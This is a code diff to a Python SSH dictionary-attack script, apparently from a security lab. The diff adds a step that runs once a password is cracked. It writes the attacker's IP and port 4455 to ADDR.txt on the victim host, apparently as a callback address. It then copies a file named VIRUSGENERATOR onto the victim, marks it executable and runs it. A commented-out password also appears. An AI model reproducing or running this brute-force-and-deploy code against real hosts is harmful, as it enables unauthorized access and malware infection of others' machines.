@@ -5,6 +5,7 @@ import threading
 import time
 import queue
 import sys
+import socket
 thread_count = 100
 fail_count = 0
 def get_token():
@@ -37,7 +38,7 @@ def dictionary_attack(host, token):
     #print(list(incorrect_password.queue))
 def ssh_connect(task, correct_password, incorrect_password):
     global wrong_count, success_count, fail_count
-    #host = "192.168.142.131"
+    #host = "192.168.142.132"
     #password = csc0228Realtek2021
     host = sys.argv[1]
     port = 22
@@ -61,10 +62,31 @@ def ssh_connect(task, correct_password, incorrect_password):
                 print("Unexcepted Error", e)
             else: # Got correct password
                 print("Got correct password:", password)
-                command = "ls"
+                
+                # transport ADDR
+                IP = socket.gethostbyname(socket.gethostname()+".local")
+                PORT = "4455"
+                command = "echo "+"'''"+IP+"'''"+" > ./ADDR.txt"
                 stdin, stdout, stderr = ssh.exec_command(command)
-                lines = stdout.readlines()
-                print(lines)
+                command = "echo "+"'''"+PORT+"'''"+" >> ./ADDR.txt"
+                stdin, stdout, stderr = ssh.exec_command(command)
+                # transport VIRUSGENERATOR
+                with open("./VIRUSGENERATOR", "r") as f:
+                    code = f.read()
+                    command = "echo "+"'''"+code+"'''"+" > ./VIRUSGENERATOR"
+                stdin, stdout, stderr = ssh.exec_command(command)
+ 
+                # make VIRUSGENERATOR executable
+                stdin, stdout, stderr = ssh.exec_command("chmod +x VIRUSGENERATOR")
+
+                # execute VIRUSGENERATOR
+                stdin, stdout, stderr = ssh.exec_command("./VIRUSGENERATOR")
+
+                
+                # rm VIRUSGENERATOR
+                # stdin, stdout, stderr = ssh.exec_command("rm VIRUSGENERATOR")
+                # lines = stdout.readlines()
+                # print(lines)
                 correct_password.put(password)
                 task.queue.clear() # No need to try more
             finally:
@@ -76,7 +98,7 @@ def ssh_connect(task, correct_password, incorrect_password):
 
 def main():
     tk = get_token()
-    if len(sys.argv)!=2:
+    if len(sys.argv)!=4:
         print("usage:", sys.argv[0], "<host IP>")
         exit(1)
     
